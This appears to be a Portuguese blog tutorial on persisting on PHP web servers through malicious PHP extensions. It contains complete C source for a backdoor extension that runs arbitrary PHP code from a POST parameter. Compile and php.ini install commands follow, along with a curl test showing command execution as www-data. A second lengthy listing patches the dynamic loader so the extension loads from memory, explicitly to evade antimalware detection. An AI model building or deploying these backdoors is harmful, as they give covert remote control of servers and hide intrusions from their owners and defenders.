---
layout: post
title: Persistência carregando extensões maliciosas do PHP na memória
---

Persistência carregando extensões maliciosas do PHP na memória
===

![php](https://bs-uploads.toptal.io/blackfish-uploads/components/blog_post_page/content/cover_image_file/cover_image/1276138/regular_1708x683_cover-0720_The10MostCommonMistakesPHPDevelopersMake_Razvan_Newsletter-6c11df72f4e75cd5151fcd588a780afe-351291a8919b1379cd95867d003050b1.png)

[toc]

# Introdução
Escrevi este artigo porque achei a técnica interessante e incomum, nunca ouvi alguém dizer que usou extensões do PHP maliciosas pra persistência.

Já que achei a técnica original muito rala eu vou abordar uma forma melhor focada em OPSEC.
# O que seriam extensões do PHP?
Uma extensão do PHP pode ser definida como um módulo ou plugin que amplia a funcionalidade do PHP.

Essas extensões adicionam novos recursos, funções ou classes que não estão incluídos no core do PHP e essas extensões são escritas em **C** ou **C++** e podem ser carregadas/compiladas dinamicamente em um servidor que usa o PHP.

Há alguns tipos de extensões do PHP:
- PECL
- Core
- Bundled ou Built-in
- External

Agora vou explicar cada uma:
- As extensões **PECL** são extensões contribuídas pela comunidade que não estão incluídas na distribuição principal do PHP e podem ser instaladas por você mesmo.
- As extensões **core** fazem parte do core do PHP e são mantidas e desenvolvidas pela equipe do PHP (jura? capitão óbvio em ação), o PHP não existe sem elas e é impossivel fazer algo no PHP sem elas.
- As extensões **built-in**, ou **bundled**, são módulos que acompanham o PHP e estão disponíveis por padrão. Elas são ativadas no arquivo de configuração do PHP e fornecem as principais funcionalidades.
- As extensões **external** ou externas são parecidas com as extensões **built-in** em quase tudo. Elas vem com o PHP, podem ser ativadas ou não mas têm uma diferença: **elas têm dependências externas**. Para ter esse tipo de extensão na tua aplicação la do PHP, você precisa ter alguma outra biblioteca ou programa pq essa extensão depende dele.
## Como funcionam & Exemplos
Para registrar uma nova extensão PHP, o codigo chama a função ``zend_register_module_ex(zend_module_entry *)``. Isso faz algumas coisas:
- Verifica as dependências da extensão, mas **apenas contra conflitos** ou seja, não carrega nenhuma outra extensão além da chamada.
- Verifica se a extensão já foi registrada e se for o caso ele avisa.
- Registra as funções da extensão PHP na tabela de funções globais, chamando `zend_register_functions(module->functions)`

Um simples exemplo de uma extensão do PHP:
```c
typedef struct _zend_module_entry zend_module_entry;
typedef struct _zend_module_dep zend_module_dep;
 
struct _zend_module_entry {
	unsigned short size;
	unsigned int zend_api;
	unsigned char zend_debug;
	unsigned char zts;
	const struct _zend_ini_entry *ini_entry;
	const struct _zend_module_dep *deps;
	const char *name;
	const struct _zend_function_entry *functions;
	int (*module_startup_func)(INIT_FUNC_ARGS);
	int (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS);
	int (*request_startup_func)(INIT_FUNC_ARGS);
	int (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS);
	void (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS);
	const char *version;
	size_t globals_size;
#ifdef ZTS
	ts_rsrc_id* globals_id_ptr;
#else
	void* globals_ptr;
#endif
	void (*globals_ctor)(void *global TSRMLS_DC);
	void (*globals_dtor)(void *global TSRMLS_DC);
	int (*post_deactivate_func)(void);
	int module_started;
	unsigned char type;
	void *handle;
	int module_number;
	const char *build_id;
};typedef struct _zend_module_entry zend_module_entry;
typedef struct _zend_module_dep zend_module_dep;
 
struct _zend_module_entry {
	unsigned short size;
	unsigned int zend_api;
	unsigned char zend_debug;
	unsigned char zts;
	const struct _zend_ini_entry *ini_entry;
	const struct _zend_module_dep *deps;
	const char *name;
	const struct _zend_function_entry *functions;
	int (*module_startup_func)(INIT_FUNC_ARGS);
	int (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS);
	int (*request_startup_func)(INIT_FUNC_ARGS);
	int (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS);
	void (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS);
	const char *version;
	size_t globals_size;
#ifdef ZTS
	ts_rsrc_id* globals_id_ptr;
#else
	void* globals_ptr;
#endif
	void (*globals_ctor)(void *global TSRMLS_DC);
	void (*globals_dtor)(void *global TSRMLS_DC);
	int (*post_deactivate_func)(void);
	int module_started;
	unsigned char type;
	void *handle;
	int module_number;
	const char *build_id;
};
```
# A técnica original
A técnica original (persistência com extensões do php) é bem simples e consiste em criar uma extensão própria do PHP escrita em C,

O interpretador do PHP carregará a extensão PHP na inicialização se ela for adicionada ao seu arquivo **php.ini** (`extension=extensao_leet.so`)

### mão na massa:
Você vai usar pelo menos 2 desses 4 hooks na criação de uma extensão:
- MINIT     <-- iniciar o módulo
- MSHUTDOWN <-- parar o módulo
- RINIT     <-- iniciar o handle de requisições
- RSHUTDOWN <-- parar o handle de requisições
  
No caso da persistência, você pode fazer uma extensão pra ler os cabeçalhos HTTP de uma requisição (igual nos módulos do apache maliciosos citados no tópico **Conclusão**) e fazer qualquer ação (tipo executar um comando).

Um exemplo:
```c
/*l33t.c - extensao maliciosa
 *para usar: 
 *   curl protocolo://ip:porta/index.php -d "l33t=system('comando');"
 */
#include "php.h"
PHP_RINIT_FUNCTION(l33t); //rinit citado anteriormente
zend_module_entry l33t_module_entry = {
    STANDARD_MODULE_HEADER,
    "l33t",          //extensao
    NULL,            //zend_function_entry
    NULL,            //MINIT
    NULL,            //MSHUTDOWN
    PHP_RINIT(l33t), //RINIT
	NULL,            //RSHUTDOWN
	NULL,            //MINFO
    "1.0",           //versao
    STANDARD_MODULE_PROPERTIES
};
ZEND_GET_MODULE(l33t);

PHP_RINIT_FUNCTION(l33t)
{
    char *metodo = "_POST";
    char *haxor = "l33t";

    #if PHP_MAJOR_VERSION < 7 //se a versao do php for menor de 7
        zval** arr;
        char* code;
        if (zend_hash_find(&EG(symbol_table), metodo, strlen(metodo) + 1, (void**)&arr) == SUCCESS) { //se o metodo for POST
            HashTable* ht = Z_ARRVAL_P(*arr);
            zval** val;
            if (zend_hash_find(ht, haxor, strlen(haxor) + 1, (void**)&val) == SUCCESS) { //se o haxor (l33t) for encontrado na requisicao
                code =  Z_STRVAL_PP(val);
                zend_eval_string(code, NULL, (char *)"" TSRMLS_CC); //executa o codigo passado no `haxor=`
            }
        }
    #else //se a versao do php for acima de 7
        zval* arr,*code = NULL;
        if (arr = zend_hash_str_find(&EG(symbol_table), metodo, sizeof(metodo) - 1)) { //se o metodo for post
            if (Z_TYPE_P(arr) == IS_ARRAY && (code = zend_hash_str_find(Z_ARRVAL_P(arr), haxor, strlen(haxor)))) { //se o haxor (l33t) for encontrado na requisicao
                zend_eval_string(Z_STRVAL_P(code), NULL, (char *)"" TSRMLS_CC); //executa o codigo passado no `haxor=`
            }
        }
    #endif
    return SUCCESS;
}
```
Arquivo `config.m4`:
```
PHP_ARG_ENABLE(l33t, 0, 0)
PHP_NEW_EXTENSION(l33t, l33t.c, $ext_shared)
```
Para compilar:
```
~$ phpize && ./configure && make && (sudo||doas make install)
```
Agora precisamos adicionar a extensão no `php.ini` e reiniciar o php
```
~# echo 'extension=l33t.so'>>/etc/php.ini
```
```
~# service php-fpm restart
```
Testando
```
~$ curl http://0.0.0.0:8443/index.php -d "l33t=system('id');"
uid=33(www-data) gid=33(www-data) grupos=33(www-data)
```
Fácil, né?
# A técnica reforçada (usando um `dlopen()` modificado para carregar uma shared library/object na memória)
Há várias formas de carregar a extensão diretamente da memória (e não do disco, por questões de OPSEC). Eu poderia re-utilizar o código do [mimix](https://github.com/m1m1x) em seu projeto [memdlopen](https://github.com/m1m1x/memdlopen) mas vou usar outro skel
```c
#include "php.h"
#include "ext/standard/info.h"
#include <sys/mman.h>
#include <pthread.h>
#ifndef ZEND_PARSE_PARAMETERS_NONE
#define ZEND_PARSE_PARAMETERS_NONE() \
    ZEND_PARSE_PARAMETERS_START(0, 0) \
    ZEND_PARSE_PARAMETERS_END()
#endif
typedef struct {
    void * data;
    size_t size;
    size_t current;
} lib_t;
lib_t libdata;
char stub[] = {0x55, 0x48, 0x89, 0xe5, 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xd0, 0xc9, 0xc3};
size_t stub_length = 18;
#define LIBC "/usr/lib/x86_64-linux-gnu/libc.so.6"
//hookz
int     my_open(const char *pathname, int flags); 
off_t   my_pread64(int fd, void *buf, size_t count, off_t offset);
ssize_t my_read(int fd, void *buf, size_t count);
void *  my_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int     my_fstat(int fd, struct stat *buf);
int     my_close(int fd);
const char read_pattern[] = {0x48, 0x29, 0xc2, 0x48,  0x8d, 0x34,  0x07, 0x44, 0x89, 0xff, 0xe8};
#define read_pattern_length 11
const char mmap_pattern[] = {0xb9, 0x12, 0x08, 0x00, 0x00, 0x44, 0x89, 0x9d, 0x20, 0xff, 0xff, 0xff, 0xe8};
#define mmap_pattern_length 13
const char fxstat_pattern[] = {0x8b, 0xbd, 0x2c, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xb5, 0x40, 0xff, 0xff, 0xff, 0xe8};
#define fxstat_pattern_length 14
const char close_pattern[] = {0x8b, 0xbd, 0x2c, 0xff, 0xff, 0xff, 0xe8};
#define close_pattern_length 7
const char open_pattern[] = {0xbe, 0x00, 0x00, 0x08, 0x00, 0x4c, 0x89, 0xf7, 0x31, 0xc0, 0xe8};
#define open_pattern_length 1
const char pread64_pattern[] = {0x48, 0x89, 0xc6, 0x48, 0x89, 0x85, 0xa8, 0xfe, 0xff, 0xff, 0xe8};
#define pread64_pattern_length 11
const char* patterns[] = {read_pattern, mmap_pattern, pread64_pattern, fxstat_pattern, close_pattern,
                          open_pattern, NULL};
const size_t pattern_lengths[] = {read_pattern_length, mmap_pattern_length, pread64_pattern_length, 
                                  fxstat_pattern_length, close_pattern_length, open_pattern_length, 0};
const char* symbols[] = {"read", "mmap", "pread", "fstat", "close", "open", NULL};
uint64_t functions[] = {(uint64_t)&my_read, (uint64_t)&my_mmap, (uint64_t)&my_pread64, (uint64_t)&my_fstat, 
                        (uint64_t)&my_close, (uint64_t)&my_open, 0}; 
char *fixes[7] = {0};
uint64_t fix_locations[7] = {0};
size_t page_size;
uint64_t first = 0;

bool find_ld_in_memory(uint64_t *addr1, uint64_t *addr2) {
    FILE* f = NULL;
    char  buffer[1024] = {0};
    char* tmp = NULL;
    char* start = NULL;
    char* end = NULL;
    bool  found = false;
    if ((f = fopen("/proc/self/maps", "r")) == NULL){
        return found;
    }
    while ( fgets(buffer, sizeof(buffer), f) ){
        if ( strstr(buffer, "r-xp") == 0 ) {
            continue;
        }
        if ( strstr(buffer, "ld-linux-x86-64.so.2") == 0 ) {
            continue;        
        }
        buffer[strlen(buffer)-1] = 0;
        tmp = strrchr(buffer, ' ');
        if ( tmp == NULL || tmp[0] != ' ')
            continue;
        ++tmp;

        start = strtok(buffer, "-");
        *addr1 = strtoul(start, NULL, 16);
        end = strtok(NULL, " ");
        *addr2 = strtoul(end, NULL, 16);
        found = true;
    }
    fclose(f);
    return found;
}
int my_open(const char *pathname, int flags) {
    void *handle;
    int (*mylegacyopen)(const char *pathnam, int flags);
    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyopen = dlsym(handle, "open");
    if (strstr(pathname, "magic.so") != 0){
        return 0x69;
    }
    return mylegacyopen(pathname, flags);
}

ssize_t my_read(int fd, void *buf, size_t count){
    void *handle;
    ssize_t (*mylegacyread)(int fd, void *buf, size_t count);

    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyread = dlsym(handle, "read");
    if (fd == 0x69){
        size_t size = 0;
        if ( libdata.size - libdata.current >= count ) {
            size = count;
        } else {
            size = libdata.size - libdata.current;
        }
        memcpy(buf, libdata.data + libdata.current, size);
        libdata.current += size;
        return size;
    }
    size_t ret =  mylegacyread(fd, buf, count);
    return ret;
}

void * my_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset){
    int mflags = 0;
    void * ret = NULL;
    uint64_t start = 0;
    size_t size = 0;
    if ( fd == 0x69 ) {
        mflags = MAP_PRIVATE|MAP_ANON;
        if ( (flags & MAP_FIXED) != 0 ) {
            mflags |= MAP_FIXED;
        }
        ret = mmap(addr, length, PROT_READ|PROT_WRITE|PROT_EXEC, mflags, -1, 0);
        size = length > libdata.size - offset ? libdata.size - offset : length;
        memcpy(ret, libdata.data + offset, size);
        mprotect(ret, size, prot);
        if (first == 0){
            first = (uint64_t)ret;
        }
        return ret;
    }
    return mmap(addr, length, prot, flags, fd, offset);
}

int my_fstat(int fd, struct stat *buf){
    void *handle;
    int (*mylegacyfstat)(int fd, struct stat *buf);
    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyfstat = dlsym(handle, "fstat64");
    if ( fd == 0x69 ) {
        memset(buf, 0, sizeof(struct stat));
        buf->st_size = libdata.size;
        buf->st_ino = 0x666; // random number
        return 0;
    }
    return mylegacyfstat(fd, buf);
}

int my_close(int fd) {
    if (fd == 0x69){
        return 0;
    }
    return close(fd);
}
ssize_t my_pread64(int fd, void *buf, size_t count, off_t offset) {
    void *handle;
    int (*mylegacypread)(int fd, void *buf, size_t count);
    handle = dlopen(LIBC, RTLD_NOW);
    mylegacypread = dlsym(handle, "pread");
    return mylegacypread(fd, buf, count);
}
bool search_and_patch(uint64_t start_addr, uint64_t end_addr, const char* pattern, const size_t length, const char* symbol, const uint64_t replacement_addr, int position) {
    bool     found = false;
    int32_t  offset = 0;
    uint64_t tmp_addr = 0;
    uint64_t symbol_addr = 0;
    char * code = NULL;
    void * page_addr = NULL;
    tmp_addr = start_addr;
    while ( ! found && tmp_addr+length < end_addr) {
        if ( memcmp((void*)tmp_addr, (void*)pattern, length) == 0 ) {
            found = true;
            continue;
        }
        ++tmp_addr;
    }
    if ( ! found ) {
        return false;
    }
    offset = *((uint64_t*)(tmp_addr + length));
    symbol_addr = tmp_addr + length + 4 + offset;
    fixes[position] = malloc(stub_length * sizeof(char));
    memcpy(fixes[position], (void*)symbol_addr, stub_length);
    fix_locations[position] = symbol_addr;
    code = malloc(stub_length * sizeof(char));
    memcpy(code, stub, stub_length);
    memcpy(code+6, &replacement_addr, sizeof(uint64_t));
    page_addr = (void*) (((size_t)symbol_addr) & (((size_t)-1) ^ (page_size - 1)));
    mprotect(page_addr, page_size, PROT_READ | PROT_WRITE); 
    memcpy((void*)symbol_addr, code, stub_length);
    mprotect(page_addr, page_size, PROT_READ | PROT_EXEC); 
    return true;
}

bool load_library_from_file(char * path, lib_t *libdata) {
    struct stat st;
    FILE * file;
    size_t read;
    if ( stat(path, &st) < 0 ) {
        return false;
    }
    libdata->size = st.st_size;
    libdata->data = malloc( st.st_size );
    libdata->current = 0;
    file = fopen(path, "r");
    read = fread(libdata->data, 1, st.st_size, file);
    fclose(file);
    return true;
}
bool fix_hook(char *fix, uint64_t addr){
    void *page_addr = (void*) (((size_t)addr) & (((size_t)-1) ^ (page_size - 1)));
    mprotect(page_addr, page_size, PROT_READ | PROT_WRITE);
    memcpy((void *)addr, fix, stub_length);
    mprotect(page_addr, page_size, PROT_READ | PROT_EXEC);
    return true;
}

extern void restore(void){
    int i = 0;
    while ( patterns[i] != NULL ) {
           if ( ! fix_hook(fixes[i], fix_locations[i]) ) {
               return;
           }
           ++i;
    }
    return;
}

void patch_all(void){
    uint64_t start = 0;
    uint64_t end = 0;
    size_t i = 0;
    page_size = sysconf(_SC_PAGESIZE);
    if (!load_library_from_file("/home/user/l33t.so", &libdata)){
        return;
    }
    if (!find_ld_in_memory(&start, &end)){
        return;
    }
    while ( patterns[i] != NULL ) {
        if ( ! search_and_patch(start, end, patterns[i], pattern_lengths[i], symbols[i], functions[i], i) ) {     
            return;
        } 
        ++i;
    }
    return;
}

static void check(void) __attribute__((constructor));
void check(void){
    printf("funcionando\n");
    return;
}
zend_result onLoad(int a, int b){
    void* handle = dlopen("/home/user/l33t.so", RTLD_LAZY);
    while (dlclose(handle) != -1){
        printf("dlclose()\n");
    }
    return SUCCESS;
}
zend_result onRequest(void){
    php_printf("deu certo veinho\n\n");
    return SUCCESS;
}
zend_module_entry l33t_module_entry = {
    STANDARD_MODULE_HEADER,
    "l33t",                  
    NULL,                   
    NULL,                           
    NULL,                           
    NULL,           
    NULL,                           
    NULL,           
    "2.0",     
    STANDARD_MODULE_PROPERTIES
};
__attribute__((visibility("default")))
extern zend_module_entry *get_module(void){
    patch_all();
    void *handler = dlopen("./magic.so", RTLD_LAZY); 
    restore();

    static Dl_info info;
    dladdr(&info, &info);
    uint64_t diffLoad = (uint64_t)&onLoad - (uint64_t)info.dli_fbase;
    uint64_t diffRequest = (uint64_t)&onRequest - (uint64_t)info.dli_fbase;
    uint64_t newLoad = first + diffLoad;
    uint64_t newRequest = first + diffRequest;

    uint64_t diffModule = (uint64_t)&l33t_module_entry - (uint64_t)info.dli_fbase;
    ((zend_module_entry *)(diffModule + first))->module_startup_func = (void *)newLoad;
    ((zend_module_entry *)(diffModule + first))->request_shutdown_func = (void *)newRequest;
    return (void *)(diffModule + first);
}
#ifdef COMPILE_DL
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(l33t)
#endif
```
# Conclusão
Eu digo que esta técnica é mais focada em OPSEC **comparada à técnica antiga** pois como eu disse anteriormente, a técnica antiga utilizava os hooks **MINIT** e **MSHUTDOWN** que gravavam o **Shared Object** no disco, deixando rastros. Com esta técnica o **Shared Object** é gravado completamente na memória, o que dificulta o processo de detecção por softwares antimalware.

Lembrando, esta não é a melhor técnica para OPSEC e é apenas uma PoC de como carregar um Shared Object na memória com o `memdlopen`/`dlopen` em um módulo do php usado pra persistência, também conhecido como **php extension backdoor**.

Agora você sabe a utilidade de extensões do PHP como método de persistência até que complexo kkkkkk mas vale a pena no final, também existem métodos semelhantes como criar um módulo pro Apache e outros do tipo.

P-P-Por hoje é só, pessoal!
![P-P-Por hoje é só, pessoal](https://steamuserimages-a.akamaihd.net/ugc/400056371821448664/44C8B2511367BF29AA14BF43D7FA39C5C3F95FD4/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false)